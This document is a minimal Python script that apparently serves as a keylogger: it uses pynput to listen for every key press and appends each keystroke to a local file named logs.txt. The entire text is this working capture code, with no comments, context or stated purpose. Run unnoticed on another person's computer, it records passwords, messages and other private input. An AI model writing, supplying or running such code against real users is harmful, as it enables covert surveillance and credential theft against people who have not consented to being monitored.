from pynput.keyboard import Listener

def writeToFile(key):
    keyData = str(key)
    with open("logs.txt", "a") as file:
        file.write(keyData)

with Listener(on_press=writeToFile) as myListener:
    myListener.join()
